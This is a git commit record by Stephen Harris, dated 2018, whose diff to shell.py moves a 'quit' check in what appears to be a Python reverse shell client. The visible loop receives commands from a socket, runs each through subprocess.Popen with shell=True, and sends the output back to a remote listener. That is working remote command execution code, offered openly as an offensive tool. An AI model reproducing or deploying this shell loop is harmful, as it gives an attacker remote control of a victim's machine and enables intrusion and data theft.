c3fe0d559b8a8b13de6fce51f17c24ee7196ac07
Stephen Harris <trackmastersteve@users.noreply.github.com>
2018-09-06 16:21:03 -0700

    moved if quit statement

--- shell.py
+++ shell.py
@@ -12,10 +12,13 @@ s.send(bytes("[*] Connection Established!", "UTF-8")) # Send connection confirma
 
 while 1: # Start loop.
     data = s.recv(1024).decode("UTF-8") # Recieve shell command.
+    if data == "quit": 
+        break # If its quit, then break out and close socket.
     # Run shell command.
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
     stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
     s.send(bytes(stdout_value)) # Send output to listener.
-    if data == "quit": 
-        break # If its quit, then break out and close socket.
+
 s.close() # Close socket.
+
+
